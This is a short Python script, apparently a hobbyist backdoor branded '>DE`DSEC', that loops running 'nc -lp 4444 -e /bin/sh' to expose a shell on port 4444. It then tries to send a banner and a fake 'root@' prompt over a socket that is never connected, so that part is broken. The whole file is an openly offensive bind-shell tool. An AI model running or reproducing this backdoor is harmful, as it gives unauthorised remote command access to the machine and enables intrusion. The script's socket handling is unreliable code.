import sys
import os
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#os.system("sudo apt install netcat")
#os.system("")
while True:
    os.system("nc -lp 4444 -e /bin/sh")
    data = s.recv(1024)
    s.send(" ____________________________\n")
    s.send("|                            |\n")
    s.send("|Conexao com >DE`DSEC aberta!|\n")
    s.send("|____________________________|\n")
    s.send("\n")
    s.send("root@>DE`DSEC#")